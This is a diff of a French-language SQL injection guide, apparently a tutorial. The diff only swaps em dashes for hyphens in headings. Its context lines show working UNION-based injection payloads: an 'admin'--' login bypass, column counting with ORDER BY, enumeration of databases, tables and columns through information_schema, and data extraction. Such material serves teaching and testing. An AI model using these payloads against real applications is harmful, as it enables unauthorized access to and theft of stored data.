@@ -65,7 +65,7 @@ admin'--
 
 > Les deux `SELECT` doivent avoir le même nombre de colonnes.
 
-**Étape 1 — Trouver le nombre de colonnes**
+**Étape 1 -  Trouver le nombre de colonnes**
 
 ```sql
 ' ORDER BY 1--
@@ -73,25 +73,25 @@ admin'--
 ' ORDER BY N--   -- erreur quand N dépasse le nombre de colonnes
 ```
 
-**Étape 2 — Lister les bases de données**
+**Étape 2 -  Lister les bases de données**
 
 ```sql
 ' UNION SELECT null, schema_name, null FROM information_schema.schemata --
 ```
 
-**Étape 3 — Lister les tables d'une base**
+**Étape 3 -  Lister les tables d'une base**
 
 ```sql
 ' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema='nom_de_la_base' --
 ```
 
-**Étape 4 — Lister les colonnes d'une table**
+**Étape 4 -  Lister les colonnes d'une table**
 
 ```sql
 ' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name='nom_de_la_table' --
 ```
 
-**Étape 5 — Extraire les données**
+**Étape 5 -  Extraire les données**
 
 ```sql
 ' UNION SELECT null, colonne1, colonne2 FROM nom_de_la_base.nom_de_la_table --
